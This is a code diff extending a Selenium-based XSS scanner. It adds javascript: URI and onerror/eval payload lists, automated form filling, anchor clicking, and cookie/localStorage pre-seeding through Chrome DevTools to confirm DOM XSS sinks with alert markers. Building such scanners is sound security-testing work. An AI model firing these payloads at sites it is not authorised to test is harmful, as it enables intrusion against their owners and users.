@@ -28,6 +28,22 @@ _BROWSER_PAYLOADS = [
     "<iframe src=\"javascript:alert('{marker}')\">",
 ]
 
+# Payloads for javascript: URI sinks (a.href, form.action, document.location, etc.)
+# The page assigns location.hash/search directly to href/location — no HTML tag needed.
+_JAVASCRIPT_URI_PAYLOADS = [
+    "javascript:alert(`{marker}`)",
+    "javascript:alert('{marker}')",
+]
+
+# Payloads for event-triggered sinks (form input value, typing events)
+# These need to be plain JS expressions that eval/innerHTML/documentWrite can execute.
+_EVENT_PAYLOADS = [
+    "alert(`{marker}`)",                          # eval() sink
+    "<img src=x onerror=\"alert(`{marker}`)\">",  # innerHTML / documentWrite sink
+    "alert('{marker}')",                           # eval() fallback
+    "<img src=x onerror=\"alert('{marker}')\">",  # innerHTML fallback
+]
+
 _ALERT_HOOK_JS = (
     "window._stingxss_hits=[];"
     "window.alert=window.confirm=window.prompt=function(v)"
@@ -36,6 +52,7 @@ _ALERT_HOOK_JS = (
 
 _SPA_BOOTSTRAP_SLEEP = 2.0   # seconds to wait for Angular/Vue/React
 _XSS_FIRE_SLEEP      = 3.0   # seconds to wait after navigation for XSS to fire
+_INTERACTION_SLEEP   = 1.5   # seconds to wait after a DOM interaction (click/type)
 
 
 class BrowserEngine:
@@ -100,6 +117,80 @@ class BrowserEngine:
         except Exception:
             return []
 
+    def _try_form_interaction(self, driver: Any, marker: str) -> str | None:
+        """Fill all visible text inputs with each event payload, submit forms.
+
+        Returns the payload string that triggered an alert, or None.
+        """
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.common.keys import Keys
+
+        for payload in [p.replace("{marker}", marker) for p in _EVENT_PAYLOADS]:
+            try:
+                # Fill every visible text-like input
+                inputs = driver.find_elements(
+                    By.CSS_SELECTOR,
+                    "input:not([type=hidden]):not([type=submit]):not([type=button])"
+                    ":not([type=reset]):not([type=checkbox]):not([type=radio]), textarea",
+                )
+                for inp in inputs:
+                    try:
+                        inp.clear()
+                        inp.send_keys(payload)
+                        # Trigger keyup/change events
+                        inp.send_keys(Keys.TAB)
+                    except Exception:
+                        pass
+
+                time.sleep(_INTERACTION_SLEEP)
+                hits = self._get_hits(driver)
+                if any(marker in h for h in hits):
+                    return payload
+
+                # Also try submitting forms
+                forms = driver.find_elements(By.TAG_NAME, "form")
+                for form in forms:
+                    try:
+                        form.submit()
+                    except Exception:
+                        pass
+
+                time.sleep(_INTERACTION_SLEEP)
+                hits = self._get_hits(driver)
+                if any(marker in h for h in hits):
+                    return payload
+
+            except Exception as exc:
+                logger.debug("Form interaction error: %s", exc)
+
+        return None
+
+    def _try_anchor_click(self, driver: Any, marker: str) -> str | None:
+        """Click any anchors whose href contains a javascript: URI with our marker.
+
+        Returns the payload string if an alert fires, or None.
+        """
+        from selenium.webdriver.common.by import By
+
+        for payload in [p.replace("{marker}", marker) for p in _JAVASCRIPT_URI_PAYLOADS]:
+            try:
+                anchors = driver.find_elements(By.TAG_NAME, "a")
+                for anchor in anchors:
+                    try:
+                        href = anchor.get_attribute("href") or ""
+                        if "javascript:" in href.lower():
+                            driver.execute_script("arguments[0].click();", anchor)
+                            time.sleep(_INTERACTION_SLEEP)
+                            hits = self._get_hits(driver)
+                            if any(marker in h for h in hits):
+                                return payload
+                    except Exception:
+                        pass
+            except Exception as exc:
+                logger.debug("Anchor click error: %s", exc)
+
+        return None
+
     def scan_url(
         self,
         url:      str,
@@ -113,6 +204,9 @@ class BrowserEngine:
 
         Also automatically discovers and tests params that live inside the URL's
         hash fragment (Angular / Vue hash-router style: ``#/path?param=val``).
+
+        After each navigation, attempts DOM interaction (form fill/submit, typing,
+        anchor clicks) to trigger event-driven and javascript:-URI sinks.
         """
         # Merge caller-supplied params with any hash-fragment params in the URL
         all_params = dict(_hash_params(url))
@@ -136,16 +230,29 @@ class BrowserEngine:
             time.sleep(_SPA_BOOTSTRAP_SLEEP)
 
             for param in all_params:
-                payloads = [p.replace("{marker}", marker) for p in _BROWSER_PAYLOADS]
-                for payload in payloads:
+                # --- Pass 1: standard HTML-injection payloads ---
+                html_payloads = [p.replace("{marker}", marker) for p in _BROWSER_PAYLOADS]
+                for payload in html_payloads:
                     try:
                         test_url = _inject_param(url, param, payload)
                         driver.get(test_url)
                         time.sleep(_XSS_FIRE_SLEEP)
                         hits = self._get_hits(driver)
                         confirmed = any(marker in h for h in hits)
+                        if not confirmed:
+                            # Attempt DOM interaction to trigger event-driven sinks
+                            confirmed_payload = self._try_form_interaction(driver, marker)
+                            if confirmed_payload:
+                                confirmed = True
+                                payload = confirmed_payload
+                            else:
+                                confirmed_payload = self._try_anchor_click(driver, marker)
+                                if confirmed_payload:
+                                    confirmed = True
+                                    payload = confirmed_payload
                         if confirmed:
-                            evidence = next(h for h in hits if marker in h)
+                            hits = self._get_hits(driver)
+                            evidence = next((h for h in hits if marker in h), marker)
                             findings.append(BrowserFinding(
                                 url=test_url,
                                 parameter=param,
@@ -169,8 +276,174 @@ class BrowserEngine:
                             time.sleep(_SPA_BOOTSTRAP_SLEEP)
                         except Exception:
                             pass
+                    if any(f.parameter == param for f in findings):
+                        break
+
+                if any(f.parameter == param for f in findings):
+                    continue
+
+                # --- Pass 2: javascript: URI payloads for hash/location sinks ---
+                for payload in [p.replace("{marker}", marker) for p in _JAVASCRIPT_URI_PAYLOADS]:
+                    try:
+                        test_url = _inject_param(url, param, payload)
+                        driver.get(test_url)
+                        time.sleep(_XSS_FIRE_SLEEP)
+                        hits = self._get_hits(driver)
+                        if any(marker in h for h in hits):
+                            evidence = next(h for h in hits if marker in h)
+                            findings.append(BrowserFinding(
+                                url=test_url,
+                                parameter=param,
+                                method="GET",
+                                payload=payload,
+                                marker=marker,
+                                confirmed=True,
+                                evidence=evidence,
+                            ))
+                            logger.info(
+                                "Browser XSS confirmed (js-uri): param=%s url=%s marker=%s",
+                                param, test_url, marker,
+                            )
+                            break
+                        # Anchor may have been created with the javascript: href — click it
+                        clicked = self._try_anchor_click(driver, marker)
+                        if clicked:
+                            hits = self._get_hits(driver)
+                            evidence = next((h for h in hits if marker in h), marker)
+                            findings.append(BrowserFinding(
+                                url=test_url,
+                                parameter=param,
+                                method="GET",
+                                payload=payload,
+                                marker=marker,
+                                confirmed=True,
+                                evidence=evidence,
+                            ))
+                            logger.info(
+                                "Browser XSS confirmed (anchor-click): param=%s url=%s marker=%s",
+                                param, test_url, marker,
+                            )
+                            break
+                    except Exception as exc:
+                        logger.debug("Browser js-uri probe error (param=%s): %s", param, exc)
+                    if any(f.parameter == param for f in findings):
+                        break
+
         except Exception as exc:
             logger.warning("BrowserEngine.scan_url failed: %s", exc)
+        finally:
+            if driver:
+                try:
+                    driver.quit()
+                except Exception:
+                    pass
+
+        return findings
+
+    def scan_url_with_preseeded_storage(
+        self,
+        url:    str,
+        marker: str,
+        base_url: str | None = None,
+    ) -> list[BrowserFinding]:
+        """Test cookie and localStorage injection sinks.
+
+        Injects the marker payload into document.cookie and localStorage keys
+        via CDP *before* page load, then checks whether a page that reads those
+        sources and passes them to a sink (eval, $parse, innerHTML, etc.) fires
+        an alert.
+
+        This covers:
+        - Angular ``$parse(document.cookie)``  (firing-range angular_cookie_parse)
+        - Angular ``$parse(localStorage.getItem(key))``  (angular_storage_parse)
+        - Any inline-script that reads cookie/localStorage into eval/innerHTML
+        """
+        findings: list[BrowserFinding] = []
+        parsed   = urllib.parse.urlparse(url)
+        spa_base = base_url or f"{parsed.scheme}://{parsed.netloc}/"
+
+        # We need to know which cookie/localStorage keys the page uses.
+        # Strategy: first load the page normally, collect all cookie names and
+        # localStorage keys, then reload with each key poisoned.
+        driver = None
+        try:
+            driver = self._setup_driver()
+            self._install_alert_hook(driver)
+
+            driver.get(url)
+            time.sleep(_XSS_FIRE_SLEEP)
+
+            # Collect existing keys
+            try:
+                cookie_names = [c["name"] for c in driver.get_cookies()]
+            except Exception:
+                cookie_names = []
+            try:
+                ls_keys = driver.execute_script(
+                    "return Object.keys(localStorage)"
+                ) or []
+            except Exception:
+                ls_keys = []
+
+            if not cookie_names and not ls_keys:
+                return findings
+
+            driver.quit()
+            driver = None
+
+            for payload_tpl in _EVENT_PAYLOADS:
+                payload = payload_tpl.replace("{marker}", marker)
+
+                # Build CDP pre-seed script
+                seed_lines = []
+                for name in cookie_names:
+                    escaped = payload.replace("\\", "\\\\").replace("`", "\\`")
+                    seed_lines.append(f"document.cookie=`{name}={escaped}`;")
+                for key in ls_keys:
+                    escaped = payload.replace("\\", "\\\\").replace("`", "\\`")
+                    seed_lines.append(f"localStorage.setItem(`{key}`,`{escaped}`);")
+
+                seed_script = _ALERT_HOOK_JS + "\n" + "\n".join(seed_lines)
+
+                driver = self._setup_driver()
+                driver.execute_cdp_cmd(
+                    "Page.addScriptToEvaluateOnNewDocument",
+                    {"source": seed_script},
+                )
+                try:
+                    driver.get(url)
+                    time.sleep(_XSS_FIRE_SLEEP)
+                    hits = self._get_hits(driver)
+                    if any(marker in h for h in hits):
+                        evidence = next(h for h in hits if marker in h)
+                        findings.append(BrowserFinding(
+                            url=url,
+                            parameter="[cookie/localStorage]",
+                            method="GET",
+                            payload=payload,
+                            marker=marker,
+                            confirmed=True,
+                            evidence=evidence,
+                        ))
+                        logger.info(
+                            "Browser XSS confirmed (storage-preseed): url=%s marker=%s",
+                            url, marker,
+                        )
+                        break
+                except Exception as exc:
+                    logger.debug("Storage preseed probe error: %s", exc)
+                finally:
+                    try:
+                        driver.quit()
+                    except Exception:
+                        pass
+                    driver = None
+
+                if findings:
+                    break
+
+        except Exception as exc:
+            logger.warning("BrowserEngine.scan_url_with_preseeded_storage failed: %s", exc)
         finally:
             if driver:
                 try:
